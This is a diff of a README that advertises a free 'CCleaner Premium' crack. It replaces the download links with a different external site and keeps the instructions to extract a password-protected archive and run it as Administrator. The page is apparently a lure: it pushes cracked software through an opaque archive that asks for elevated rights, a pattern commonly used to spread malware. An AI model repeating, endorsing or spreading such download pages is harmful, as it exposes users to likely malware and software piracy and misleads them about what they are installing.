@@ -9,7 +9,7 @@ The **🧹 CCleaner Premium** is a **free** full unlock for CCleaner that gives 
 
 <div align="center">
 
-[![Download CCleaner Premium](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/ccleaner-premium)
+[![Download CCleaner Premium](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/ccleaner-premium)
 
 </div>
 
@@ -99,7 +99,7 @@ CCleaner keeps your PC clean, but premium features are locked behind a subscript
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Click "Unlock" → Restart CCleaner
 
-[![Download CCleaner Premium](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/ccleaner-premium)
+[![Download CCleaner Premium](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/ccleaner-premium)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -241,7 +241,7 @@ Get full CCleaner premium features for free. **CCleaner Premium** unlocks real-t
 
 <div align="center">
 
-[![Download CCleaner Premium](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/ccleaner-premium)
+[![Download CCleaner Premium](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/ccleaner-premium)
 
 **Version 4.6.1** — Free CCleaner premium unlock. April 2026 update. Zero cost. No payment.
 
